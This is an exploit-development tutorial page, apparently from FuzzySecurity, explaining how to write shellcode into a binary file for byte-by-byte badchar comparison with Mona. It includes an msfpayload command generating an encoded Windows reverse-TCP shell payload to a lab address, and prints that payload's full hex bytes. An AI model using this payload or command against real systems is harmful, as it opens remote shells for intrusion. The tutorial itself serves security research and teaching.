@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Tutorials: Writing shellcode to binary files</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../css/icons.css">  
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../index.html">Home</a>
+            </li>
+            <li><a href="../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../coding.html">Scripting</a>
+            </li>
+            <li><a href="../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../links.html">Links</a>
+            </li>
+            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Writing  shellcode to binary files</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Writing  shellcode to binary files<span class="line"></span></h2>
+        <p>I have been doing allot of exploit development recently. The  g00ns out there with some exploits under their belt know one of the biggest  obstacles in the development process are the badchars. Thank god for us <strong>corelanc0d3r</strong> has developed some tools which enable us to do rapid reliable exploit  development (<strong>big shout-out to the corelan team!!</strong>). One of the features of <a href="http://redmine.corelan.be/projects/mona">Mona</a> and <a href="http://redmine.corelan.be/projects/pvefindaddr">Pvefindaddr</a> is the ability to compare shellcode in memory with the original  version (byte per byte). Hence if there are any mangled bytes in memory we can  easily flag them as badchars and re-encode our payload. To perform this  analysis we need to store the original version of our shellcode in a binary  file. This tutorial will walk you through that process. First we will do things  <em>&ldquo;The Hard/Tedious Way&rdquo;</em> and then I&rsquo;ll show you a small script I made to do  things <em>&rdquo;The Easy Way&rdquo;</em>. Let&rsquo;s get to it!!<br />
+            <br />
+            For the  purpose of this tutorial I&rsquo;ll be working with Windows PE files (Portable  Executable) however these techniques work with other fileformat payloads  (such as pdf&rsquo;s) so use your imagination. I&rsquo;ll also be using a high-end  Antivirus (ESET Smart Security 5,  none of that AVG bull!#*t hehe), updated  with the latest virus signature database.<br />
+            <br />
+            
+      <h2 class="title">(1) The Hard Way<span class="line"></span></h2>
+      <div class="fourteen columns bottom">
+      <p>First we need some sample shellcode. You can use shellcode from a pre-existing  exploit or generate some with the metasploit framework. For the purpose of this  tutorial we&rsquo;ll be generating it with msf and writing it to a  text file…</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@bt</span>:~/Desktop# <span style='color:#2B8156;'>msfpayload windows/shell/reverse_tcp LHOST=192.168.98.64 LPORT=9988 R |msfencode -e 
+x86/alpha_mixed -b "\x00" -t c >> test.txt</span>
+
+<span style="color:#333399;">[*]</span> x86/alpha_mixed succeeded with size 642 (iteration=1)</pre>
+<br />
+</div><p>&nbsp;</p>
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/bin_big1.png" rel="prettyPhoto[bin]">
+          <img src="images/bin_small1.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Shellcode</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>As you might have guessed the current shellcode format is  not suitable for our purposes. Let&rsquo;s try to fix that with some cat-grep-tr-sed  kung-fu. We will need to transform the format of our shellcode from this &ldquo;\x89\xe5\xdb&rdquo;  to this &ldquo;89e5db&quot;. This  magic might need some clarification. (1) With grep we filter out only the lines  that contain &rdquo;(2) tr -d&rdquo; removes all whitespaces (3) tr -d &rdquo;\n&rdquo; removes all  new lines (4) sed deletes several characters (\&quot;x;). The  result is a clean output of the raw hex-bytes.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<span style="color:#ff0000;">root@bt</span>:~/Desktop# <span style='color:#2B8156;'>cat test.txt |grep '"' |tr -d " " |tr -d "\n" |sed 's/[\"x;]//g'</span>
+
+89e5dbdad975f45f57594949494949494949494943434343434337515a6a415850304130416b414151324142324242304242414258
+50384142754a49496c79786e6935505770655055306d5939757031385252444e6b663230304c4b6272344c6c4b614272344e6b7072
+6578766f6837337a45765031596f54716b706e4c656c3171516c6662364c713049517a6f566d33314a676b526870314266376c4b50
+5232306e6b4262756c677158506c4b473071686e6549506434626a66616e3046304e6b526846786e6b63684750477159434b53774c
+52694c4b70344c4b333138563561396f647149504e4c79515a6f444d56616f3745684d30343548746773734d6a58456b534d664443
+454a4262784e6b5638613437714a7352464e6b744c626b4c4b7058576c33315a736c4b55546e6b45517a704b39626466446644614b
+314b75313369505a4271696f6b503148514f505a6c4b77627a4b4d56336d653847435652555057705068316733435742314f327442
+48526c5077475663374b4f48554c784a306661655047704469595446345270553866496b30706b7550496f69454630563070505630
+51507270637070503068697a566f794f4b506b4f69456c57524a533562484950793850623730506876625330457757746d59786630
+6a46705146514765384a394d7561645171696f69454c454b706254544c496f726e666872555a4c33584c304c7549325146496f6945
+324a6770517a3444714630576178377258597a68436f6b4f4e356e6b7036624a5370753843303230455067705276706a3550735830
+586c6452733865396f58554e737273335a6770736651437367706864426e397a68736f396f7a7547716b7331394a664e6548767165
+7a4c48434141 </pre>
+<br /></div>
+
+<p>&nbsp;</p>
+<p>So  far so good let&rsquo;s create a template binary file by echoing some rubbish into it. After that we can open it in hexeditor for further manipulation.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@bt</span>:~/Desktop# <span style='color:#2B8156;'>echo &quot;boring&quot; &gt;&gt; template.bin</span>
+
+<span style="color:#ff0000;">root@bt</span>:~/Desktop# <span style='color:#2B8156;'>hexeditor -b template.bin</span></pre>
+<br />
+</div><p>&nbsp;</p>
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/bin_big2.png" rel="prettyPhoto[bin]">
+          <img src="images/bin_small2.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Hexeditor</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>Now  we need to add space for our shellcode, hold down &ldquo;Ctrl-a&rdquo; to insert empty  space (be sure to add enough don&rsquo;t worry if it&rsquo;s too much). Copy the buffer we  created above and paste it into the empty space with &rdquo;Shift-Insert&rdquo;. After that  is done delete the excess space and the junk we echoed into the binary file.  You can see these three phases in the screenshots below.</p><p>&nbsp;</p>
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/bin_big3.png" rel="prettyPhoto[bin]">
+          <img src="images/bin_small3.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Hex-Empty</p>
+      </div>
+      
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/bin_big4.png" rel="prettyPhoto[bin]">
+          <img src="images/bin_small4.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Hex-Paste</p>
+      </div>
+      
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/bin_big5.png" rel="prettyPhoto[bin]">
+          <img src="images/bin_small5.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Hex-Saved</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>All  that remains now is to press &ldquo;Ctrl-x&rdquo; to close and save the binary file. That&rsquo;s  all there is to it. While this isn&rsquo;t really hard it is certainly tedious,  especially if we have to redo this process several times.</p><br />
+
+<h2 class="title">(2) The Easy Way<span class="line"></span></h2>
+<p>I  thought to myself why waste two minutes of my life each time I have to create a  *.bin file.  After a bit of research I created  a small script to do all the work for me. Just execute the script without any  parameters to see the menu. You can download it from the <a href="http://www.fuzzysecurity.com/coding.html">coding</a> page.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@bt</span>:~/Desktop# <span style='color:#2B8156;'>./bin.sh</span>
+--------------------------------------------------------------------
+|                          Bin v1.0 ~ b33f                         |
+|                  -Convert you shellcode to *.bin-                |
+--------------------------------------------------------------------
+| USAGE: ./bin.sh -i [Input File] -o [Output File] -t [B/Z]        |
+|                                                                  |
+| REQUIRED                                                         |
+|         -i  Input (text) file containing the shellcode.          |
+|         -o  Output filename without extention (eg: shell).       |
+|         -t  Type can be B (regular bin file) or Z (zipped.       |
+|             bin file).                                           |
+|                                                                  |
+| DETAILS                                                          |
+|         The input text file should just contain the shellcode.   |
+|         If you are using msfpayload (possibly/probably in        |
+|         combinatione with msfencode) set the output type to      |
+|         c or perl. If you have some shellcode in an exploit      |
+|         just copy it to a text file...                           |
+--------------------------------------------------------------------</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>The  script has some error tolerance for sloppy-copy use. It should filter out junk  characters when copying from most common exploits formats (python, perl, c).  When using msfpayload/msfencode you can set the output type to perl or c. Feel  free to add some rules for filtering (email me if you have any suggestions).  The rule of thumb is to copy as cleanly as possible and check the contents of  the binary file. I also added an option to zip the resulting binary file, the  reason for this is that I usually transfer files to my debugging machine with  an apache server and internet explorer doesn&rsquo;t like binary files much.</p><br />
+  <p>Time  for a demonstration!! For the sake of diversity I&rsquo;ll be using some shellcode  from an exploit I developed recently. First I copy the shellcode into a text  file (badchars.txt). See the screenshots below, take notice that my sloppy-copy doesn't affect the script…</p><p>&nbsp;</p>
+
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/bin_big6.png" rel="prettyPhoto[bin]">
+          <img src="images/bin_small6.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Egg Hunter Sample shellcode</p>
+      </div>
+      
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/bin_big7.png" rel="prettyPhoto[bin]">
+          <img src="images/bin_small7.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Egg Hunter paste</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+  <p>All  that&rsquo;s left to do is run the script and check out the results in the hexeditor.  Enjoy all those precious minutes you&rsquo;ll be saving every time you develop an exploit ;))…</p><p>&nbsp;</p>
+  
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/bin_big8.png" rel="prettyPhoto[bin]">
+          <img src="images/bin_small8.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Hexeditor output</p>
+      </div>
+
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../index.html">Home</a> |
+          <a href="../tutorials.html">Tutorials</a> |
+          <a href="../coding.html">Scripting</a> |
+          <a href="../exploits.html">Exploits</a> |
+          <a href="../links.html">Links</a> |
+          <a href="../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
